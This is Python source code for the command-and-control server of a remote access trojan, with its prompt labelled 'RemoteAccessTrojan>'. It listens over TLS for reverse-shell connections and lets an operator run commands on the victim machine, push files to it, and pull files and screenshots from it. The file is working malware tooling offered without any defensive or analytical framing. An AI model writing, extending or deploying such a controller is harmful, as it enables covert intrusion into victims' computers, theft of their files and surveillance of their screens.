import socket
import ssl
import os
import sys
import time

HOST = '0.0.0.0'
PORT = 4443

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Setup SSL
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
try:
    context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
except FileNotFoundError:
    print("[!] SSL certificate or key not found.")
    sys.exit(1)
except ssl.SSLError as e:
    print(f"[!] SSL certificate error: {e}")
    sys.exit(1)

def handle_client(client, addr):
    print(f"[+] Reverse Shell Connected from {addr}.\n")
    while True:
        try:
            cmd = input("RemoteAccessTrojan> ").strip()
            if not cmd:
                continue

            # exit session
            if cmd.lower() in ["exit", "quit"]:
                client.sendall(b"exit")
                print("[+] Session terminated.")
                break

            # clear screen
            if cmd.lower() in ["cls", "clear"]:
                clear_screen()
                continue

            # --- Handle upload command ---
            if cmd.lower().startswith("upload "):
                filepath = cmd[7:].strip()
                if not os.path.isfile(filepath):
                    print(f"[!] File not found: {filepath}")
                    continue
                client.sendall(cmd.encode())  # send the command to notify client
                time.sleep(0.2)  # small delay for client ready

                with open(filepath, "rb") as f:
                    data = f.read()
                client.sendall(data)
                client.sendall(b"__end__")
                print(f"[+] Uploaded {filepath} to client current directory")
                continue

            # send normal command
            client.sendall(cmd.encode())

            # receive first packet
            header = client.recv(4096)
            if not header:
                raise ConnectionResetError("Connection lost.")

            # --- Handle Screenshot ---
            if header.startswith(b"SCREENSHOT"):
                try:
                    parts = header.decode().split()
                    size = int(parts[1])
                    img_bytes = b""

                    remainder = header.split(b"\n", 1)
                    if len(remainder) > 1:
                        img_bytes += remainder[1]

                    while len(img_bytes) < size:
                        chunk = client.recv(4096)
                        if not chunk:
                            raise ConnectionResetError("Connection lost.")
                        img_bytes += chunk
                        print(f"\r[*] Receiving screenshot... {len(img_bytes)}/{size} bytes", end="", flush=True)

                    print()  # new line after progress

                    filename = f"screenshot_{int(time.time())}.png"
                    with open(filename, "wb") as f:
                        f.write(img_bytes[:size])

                    print(f"[+] Screenshot received and saved as {filename}")
                except Exception as e:
                    print(f"[!] Screenshot receive error: {e}")
                continue

            # --- Handle File Download ---
            if header.startswith(b"FILE"):
                try:
                    parts = header.decode().split()
                    size = int(parts[1])
                    file_bytes = b""

                    while len(file_bytes) < size:
                        chunk = client.recv(4096)
                        if not chunk:
                            raise ConnectionResetError("Connection lost.")
                        file_bytes += chunk
                        print(f"\r[*] Receiving file... {len(file_bytes)}/{size} bytes", end="", flush=True)
                    print()  # newline

                    filename = input("Save as: ").strip()
                    if not filename:
                        filename = f"downloaded_{int(time.time())}"
                    with open(filename, "wb") as f:
                        f.write(file_bytes[:size])
                    print(f"[+] File saved as {filename}")
                except Exception as e:
                    print(f"[!] File download error: {e}")
                continue

            # --- Normal command output ---
            result = header
            while True:
                if b"__end__" in result:
                    result = result.replace(b"__end__", b"")
                    break
                data = client.recv(4096)
                if not data:
                    raise ConnectionResetError("Connection lost.")
                result += data

            output = result.decode(errors="ignore").strip()
            print(output if output else "[*] No output returned.")

        except (ConnectionResetError, BrokenPipeError):
            print(f"\n[!] Client {addr} disconnected.\n")
            break
        except Exception as e:
            print(f"[!] Error in command loop: {e}")
            break

def main():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((HOST, PORT))
            server_socket.listen(5)

            print(f"[+] Listening on port {PORT}...")
            print("[*] Waiting for incoming connection...")

            with context.wrap_socket(server_socket, server_side=True) as ssl_server:
                while True:
                    try:
                        client, addr = ssl_server.accept()
                        print(f"\n[+] Hello There! Welcome to Reverse Shell {addr}")

                        try:
                            handle_client(client, addr)
                        except Exception as e:
                            print(f"[!] Error handling client {addr}: {e}")
                        finally:
                            client.close()
                            print("[*] Waiting for incoming connection...")

                    except KeyboardInterrupt:
                        print("\n[!] Interrupted by user.")
                        break
                    except Exception as e:
                        print(f"[!] Listener error: {e}")
                        time.sleep(2)

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[!] Fatal error: {e}")

if __name__ == "__main__":
    main()
